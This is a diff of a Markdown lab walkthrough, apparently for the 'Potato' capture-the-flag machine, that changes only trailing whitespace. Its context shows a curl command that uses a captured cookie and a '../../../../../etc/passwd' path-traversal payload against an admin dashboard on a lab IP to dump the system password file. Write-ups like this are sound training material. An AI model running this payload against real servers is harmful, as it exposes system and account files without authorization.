@@ -76,7 +76,7 @@ Input the `exit`.
     ![file_directory](./img/potato_server10.png)
     ![etc_passwd](./img/potato_server11.png)
 1. Make /etc/passwd data file using the Cookie pass and curl command
-    - Cookie pass is as follows
+    - Cookie pass is as follows  
     ![Cookie_pass](./img/potato_server12.png)
     - Curl command is as follows  
     `curl -X POST -b "pass=serdesfsefhijosefjtfgyuhjiosefdfthgyjh" -d 'file=../../../../../etc/passwd' "http://192.168.56.102/admin/dashboard.php?page=log" | tr '\0' '\n' | cat > etc_passwd.txt`  
